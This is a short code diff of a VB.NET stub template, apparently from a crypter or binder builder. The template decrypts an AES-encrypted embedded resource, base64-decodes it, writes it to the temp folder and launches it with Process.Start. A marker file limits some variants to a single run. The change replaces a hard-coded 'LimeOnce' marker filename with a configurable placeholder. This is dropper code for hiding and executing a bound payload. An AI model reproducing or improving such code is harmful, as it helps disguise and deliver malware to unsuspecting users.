@@ -36,9 +36,9 @@ Public Class %Class1%
 '%Bind%		 Dim %DecBind% = %AES_Decrypt%(%Res%.GetObject("%EncryptedBind%"),"%KEY%")
 '%Bind%		 Dim %Binder% = Convert.FromBase64String(%DecBind%)
 '%Bind%
-'%BindOnce%  If IO.File.Exists(IO.Path.GetTempPath + "\LimeOnce") = False Then
+'%BindOnce%  If IO.File.Exists(IO.Path.GetTempPath + "\" + "%LimeOnce%") = False Then
 '%BindOnce%  IO.File.WriteAllBytes(IO.Path.GetTempPath + "\" + "%BindName%",%Binder%)
-'%BindOnce%	 IO.File.CreateText(IO.Path.GetTempPath + "\LimeOnce")
+'%BindOnce%	 IO.File.CreateText(IO.Path.GetTempPath + "\" + "%LimeOnce%")
 '%BindOnce%  Process.Start(IO.Path.GetTempPath + "\" + "%BindName%")
 '%BindOnce%	 End If
 '%BindDaily% IO.File.WriteAllBytes(IO.Path.GetTempPath + "\" + "%BindName%",%Binder%)
